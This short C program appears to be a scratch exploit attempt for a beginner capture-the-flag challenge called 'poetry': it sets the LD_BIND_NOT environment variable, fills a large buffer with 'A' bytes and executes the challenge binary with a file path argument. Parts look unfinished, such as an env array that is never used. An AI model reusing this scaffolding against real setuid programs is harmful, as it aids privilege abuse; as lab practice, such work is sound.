#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

char buffer[823200];

extern char** environ;

int main()
{
    char *argv[] = {"./poetry","/home/noname/projects/gctf/beginner/poetry/filer", NULL};
    char *env[] = { "LD_BIND_NOT=1", NULL };

    setenv("LD_BIND_NOT","0", 1);
    memset(buffer,0x41,sizeof(buffer));   
    execve("./poetry", argv, environ);
}
